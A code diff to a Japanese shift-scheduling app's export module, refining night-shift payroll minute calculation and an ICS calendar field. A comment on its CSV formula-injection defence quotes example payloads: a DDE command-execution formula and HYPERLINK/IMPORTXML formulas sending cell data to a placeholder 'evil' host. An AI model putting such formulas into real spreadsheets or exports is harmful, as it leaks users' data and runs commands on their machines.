@@ -29,6 +29,7 @@ from shiftai.domain import (
     format_jp_date,
     format_jp_date_full,
     japanese_weekday,
+    to_minutes,
 )
 
 SHIFT_DF_COLUMNS: list[str] = [
@@ -376,8 +377,12 @@ def payroll_dataframe(
                         early_days.add(shift_day.day)
                     if slot.overlaps(*LATE_WINDOW):
                         late_days.add(shift_day.day)
-                    if slot.start >= time(22, 0) or slot.end <= time(5, 0) or slot.overlaps(time(22, 0), time(23, 59)):
-                        night_min += slot.minutes
+                    # 深夜時間帯（22:00〜05:00）との厳密な重複分数を加算
+                    s_start = slot.start_minutes
+                    s_end = 24 * 60 if slot.is_midnight_end else to_minutes(slot.end)
+                    late_overlap = max(0, min(s_end, 24 * 60) - max(s_start, 22 * 60))
+                    early_overlap = max(0, min(s_end, 5 * 60) - max(s_start, 0))
+                    night_min += (late_overlap + early_overlap)
                     if is_holiday:
                         holiday_min += slot.minutes
                 elif state is CellState.BREAK:
@@ -437,7 +442,7 @@ def payroll_dataframe(
 #: 出力 CSV のセル値はユーザー入力（氏名・資格・園名など）を含むため、
 #: この文字で始まると利用者が Excel で開いた瞬間に実行される。
 #: 代表的な攻撃: ``=cmd|'/c calc'!A1`` / ``=HYPERLINK("http://evil/?d="&A1,"x")``
-#: / ``=IMPORTXML("http://evil/?d="&A1,"//a")``（GAS 経由で持股窃取）。
+#: / ``=IMPORTXML("http://evil/?d="&A1,"//a")``（GAS 経由で外部へのデータ窃取）。
 #:
 #: タブ（``\t``）と carriage return（``\r``）も先頭にあると数式扱いされるため、
 #: 前後に空白がある場合も対象に含める。
@@ -606,7 +611,7 @@ def to_ics(result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMemb
                         f"DTEND:{end_dt:%Y%m%dT%H%M%S}",
                         f"SUMMARY:{_ics_escape(summary)}",
                         f"DESCRIPTION:{_ics_escape(f'職種: {role_text}')} 作業時間: {minutes} 分",
-                        f"X-ALT-DESC;FMTTYPE=text:{_ics_escape(alt_desc)}",
+                        f"X-ALT-DESC;FMTTYPE=text/plain:{_ics_escape(alt_desc)}",
                         "TRANSP:OPAQUE",
                         "END:VEVENT",
                     ]
